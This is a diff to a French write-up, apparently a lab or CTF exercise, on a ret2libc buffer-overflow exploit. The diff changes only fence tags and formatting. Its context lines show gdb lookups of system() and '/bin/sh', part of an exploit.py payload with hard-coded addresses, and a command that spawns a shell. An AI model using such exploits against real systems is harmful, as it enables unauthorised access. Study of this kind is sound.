@@ -21,12 +21,12 @@ int main(int argc, char *argv[])
 
 Apres avoir trouver l'`offset` , il faut executer la fonction `systeme` et lui donner comme arguement `/bin/sh`
 
-```c
+```sh
 (gdb) print system
 # $1 = {<text variable, no debug info>} 0xf7c4c870 <system>
 ```
 
-```c
+```sh
 (gdb)  find /bin/sh
 # Searching for '/bin/sh' in: None ranges
 # Found 1 results, display max 1 items:
@@ -43,8 +43,8 @@ buf += "\xc8\x5f\xdb\xf7" # /bin/sh <-- reverse notation
 print buf./run $(python2 exploit.py)
 ```
 
-> **Executer le programme pour obtenir un shell**
+Executer le programme pour obtenir un shell
 
-```c
+```sh
 ./run $(python2 exploit.py)
 ```
